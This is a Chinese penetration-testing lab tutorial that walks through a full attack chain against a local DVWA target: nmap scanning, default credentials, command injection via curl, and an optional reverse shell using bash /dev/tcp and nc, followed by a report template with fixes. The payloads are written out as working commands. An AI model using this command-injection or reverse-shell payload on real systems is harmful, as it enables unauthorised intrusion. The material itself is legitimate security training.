## 一、综合实战：DVWA 完整渗透链

把前五天学的东西串成**一条**完整的攻击链，从头走一遍：

```
信息收集 → 弱口令 → 漏洞利用(RCE) → 写报告
   D3         D4          D5          产出
```

### 步骤 1 · 信息收集（D3）

```bash
nmap -sV -p 8081 127.0.0.1
```

```
PORT     STATE SERVICE VERSION
8081/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

**看到了什么**：8081 开着、Apache 2.4.25（2016 年的老版本，指印泄露 = 攻击者立刻去查这个版本的公开漏洞）。

### 步骤 2 · 弱口令（D4）

登录 `admin` / `password`（或用 Burp Intruder 爆破出来）。真实渗透里这步就是"拿到入口"——大部分漏洞都要先进来才能打。

### 步骤 3 · 漏洞利用 RCE（D5）

DVWA → **Command Injection**（exec 模块）→ 命令注入拿执行权限：

```bash
curl -s -b /tmp/dv.txt -b "security=low" \
  --data-urlencode "ip=127.0.0.1; id" \
  --data-urlencode "Submit=Submit" \
  http://127.0.0.1:8081/vulnerabilities/exec/ | grep -oE "uid=[0-9]+\([^)]*\)"
```

```
uid=33(www-data) gid=33(www-data)
```

**这一行 = 拿到了 shell 权限**（能以 Web 服务器身份 `www-data` 执行任意命令）。这就是"从外部进到服务器内部"的完整闭环。

## 二、进阶：反弹 shell（可选彩蛋）

上面的 `;id` 已经证明了 RCE。如果想更进一步、把 shell "接回自己电脑"（交互式控制），用**反弹 shell**：

```bash
# 攻击机（Mac）先开监听
nc -l 4444

# 靶场 exec 里注入（把 192.168.5.2 换成你 Mac 在 colima 网络里的地址）
127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.5.2/4444 0>&1'
```

> ⚠️ 网络路径较绕：DVWA 容器 → colima VM 网关(172.18.0.1) → Mac(colima 网络的 192.168.5.2)。本会话因 macOS 的 `nc` 绑定问题没完整打通（`lsof` 显示没真正监听），**留作你自己调试的进阶题**。想确认 RCE 的话，用 `;id` 就够了。

## 三、渗透报告模板

> 存到 `reports/渗透报告-D6.md`，填空即可。

```markdown
# 渗透测试报告 · DVWA

## 目标
- 目标：DVWA 靶场（本机 Docker）
- 地址：127.0.0.1:8081
- 授权：本地自建靶场（学习用途）

## 信息收集
- 端口：8081 开放
- 服务：Apache 2.4.25 + PHP
- 版本风险：2.4.25 为 2016 年老版本，存在已知漏洞

## 漏洞发现
| 编号 | 漏洞类型 | 位置 | 风险 |
|---|---|---|---|
| 1 | 弱口令 | 登录入口 | 高 |
| 2 | 命令注入(RCE) | /vulnerabilities/exec/ | 严重 |

## 利用过程（截图/命令输出）
1. 弱口令登录 admin/password
2. exec 模块注入 `127.0.0.1; id` → uid=33(www-data)

## 修复建议
- 修改默认口令、加登录限流
- 命令执行用白名单（escapeshellcmd / 禁用 shell_exec）
```
